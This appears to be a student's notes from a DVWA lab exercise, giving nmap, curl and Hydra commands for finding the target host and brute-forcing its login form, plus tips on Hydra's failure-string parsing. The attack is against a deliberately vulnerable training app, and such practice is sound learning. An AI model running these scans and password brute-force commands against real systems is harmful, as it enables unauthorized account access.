# Commands used

All run from the exercise's attack box over SSH — never from a personal machine.

```bash
# 1) my own address on the attack box
sudo ifconfig                       # eth0 -> inet 173.2.76.2  (subnet 173.2.76.0/24)

# 2) discover DVWA: the host with BOTH 80/http and 3306/mysql open
sudo nmap -F 173.2.76.0/29          # -> crvekruh_dvwa_1 ... (173.2.76.4)

# 3) DEBUG: verify the request/session with curl (ground truth) before trusting Hydra
curl -s "http://173.2.76.4/vulnerabilities/brute/?username=admin&password=<known-good>&Login=Login" \
  -H "Cookie: PHPSESSID=<session>; security=low" | grep -i "welcome\|incorrect"
# a correct login returns: <p>Welcome to the password protected area admin</p>

# 4) brute-force the login form
#    - F= must be a SINGLE WORD (no spaces) or Hydra's parser mis-handles it -> false positives
#    - replace <session> with a fresh, authenticated PHPSESSID (security=low)
hydra 173.2.76.4 -F -V \
  -L /usr/share/usernames \
  -P /usr/share/common.txt \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=<session>; security=low"

# result: login: richard   password: **** (redacted); genuine hit ~attempt 38,900
```

Notes:
- `-F` stop on first hit, `-V` verbose, `-I` ignore any hydra.restore file.
- `F=incorrect` is the FAILURE string; a response WITHOUT it is treated as a valid login.
  A multi-word `F=`/`S=` string silently breaks matching and reports every attempt as success.
- The `H=Cookie` header carries the authenticated session + `security=low`.
- Always confirm a reported hit by logging in via the browser before submitting it.
